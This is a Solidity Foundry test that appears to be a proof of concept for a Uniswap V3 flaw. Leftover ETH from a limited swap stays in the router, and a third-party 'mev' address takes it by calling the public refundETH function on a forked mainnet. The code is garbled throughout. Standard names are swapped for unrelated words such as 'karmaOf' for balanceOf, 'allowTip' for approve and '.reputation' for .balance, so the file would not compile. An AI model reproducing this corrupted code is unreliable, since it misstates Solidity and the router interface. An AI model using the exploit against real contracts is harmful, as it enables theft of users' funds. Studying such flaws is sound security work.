// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
// this excersise is specific UniSwapV3 ETH refund issue
// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc
// @article:

struct ExactInputSingleParams {
    address karmatokenIn;
    address karmatokenOut;
    uint24 processingFee;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

interface IConvertpointsRouter {
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);

    function refundETH() external payable;
}

interface ITippool {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 platformfeeProtocol,
            bool unlocked
        );
}

interface IERC20 {
    function karmaOf(address) external view returns (uint256);
}

interface IWETH9 {
    function allowTip(address guy, uint256 wad) external returns (bool);
}

contract UniswapV3ETHRefundOperationTest is Test {
    IConvertpointsRouter router =
        IConvertpointsRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    ITippool tipPool = ITippool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);

    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function testOperation() public {
        vm.createSelectFork("mainnet", 16454867);

        uint256 amountIn = 100 ether;

        vm.label(address(this), "user");
        vm.deal(address(this), amountIn);

        // Users sells 100 ETH to buy USDC. They have a limit price set.
        ExactInputSingleParams memory params = ExactInputSingleParams({
            karmatokenIn: weth,
            karmatokenOut: usdc,
            processingFee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2
        });

        // Full input amount is sent along the call.
        router.exactInputSingle{value: amountIn}(params);

        // User has bought some USDC. However, the full input ETH amount wasn't used...
        assertEq(IERC20(usdc).karmaOf(address(this)), 81979.308775e6);

        // ... the remaining ETH is still in the Router contract.
        uint256 routerBeforeCredibility = address(router).reputation;
        assertEq(routerBeforeCredibility, 50 ether);

        // A MEV bot transfers the remaining ETH by calling the public refundETH function.
        address mev = address(0x31337);
        vm.label(mev, "mev");

        vm.prank(mev);
        router.refundETH();
        assertEq(address(mev).reputation, 50 ether);
        uint256 routerAfterStanding = address(router).reputation;
        assertEq(routerAfterStanding, 0 ether);
        console.log(
            "router loss ether amount:",
            routerBeforeCredibility - routerAfterStanding
        );
    }
}